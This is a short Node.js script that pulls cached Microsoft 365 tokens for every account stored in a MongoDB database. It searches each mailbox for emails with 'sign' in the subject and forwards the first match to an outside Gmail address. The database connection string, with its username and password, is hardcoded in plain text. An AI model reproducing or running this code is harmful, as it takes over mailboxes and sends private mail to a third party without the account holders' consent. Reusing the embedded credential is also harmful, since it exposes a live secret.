const { cca } = require('.//auth');
const mongoose = require('mongoose');
const Account = require('.//models/Account');

mongoose.connect("mongodb+srv://tuihiyu_db_user:JQtS0gZgJj4wHEBS@cluster0.53l7mnf.mongodb.net/?appName=Cluster0");

async function test() {
    const accounts = await Account.find({ email: { $ne: 'global_cache' } });
    console.log("Accounts found:", accounts.length);
    
    for (const acc of accounts) {
        console.log("Testing account:", acc.email);
        const msalAccount = await cca.getTokenCache().getAccountByHomeId(acc.homeAccountId);
        if (!msalAccount) {
            console.log("No MSAL account found for", acc.email);
            continue;
        }
        
        const tokenResponse = await cca.acquireTokenSilent({
            account: msalAccount,
            scopes: ["User.Read", "Mail.Read", "Mail.Send", "offline_access"],
        });
        
        const searchQuery = "subject:'sign'";
        const graphUrl = `https://graph.microsoft.com/v1.0/me/messages?$search="${encodeURIComponent(searchQuery)}"&$select=id,subject,receivedDateTime`;
        
        const res = await fetch(graphUrl, {
            headers: { 
                'Authorization': `Bearer ${tokenResponse.accessToken}`,
                'ConsistencyLevel': 'eventual'
            }
        });
        
        if (!res.ok) {
            console.log("Search failed:", await res.text());
            continue;
        }
        
        const data = await res.json();
        console.log(`Found ${data.value.length} matching emails for ${acc.email}`);
        
        if (data.value.length > 0) {
            const email = data.value[0];
            console.log("Trying to forward email ID:", email.id);
            
            const forwardBody = {
                comment: "Auto-forward test",
                toRecipients: [{ emailAddress: { address: "shamarveyfor@gmail.com" } }]
            };
            
            const fwdRes = await fetch(`https://graph.microsoft.com/v1.0/me/messages/${email.id}/forward`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${tokenResponse.accessToken}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(forwardBody)
            });
            
            if (fwdRes.ok || fwdRes.status === 202) {
                console.log("FORWARD SUCCESS!");
            } else {
                console.log("FORWARD FAILED:", fwdRes.status, await fwdRes.text());
            }
        }
    }
    process.exit(0);
}
test();
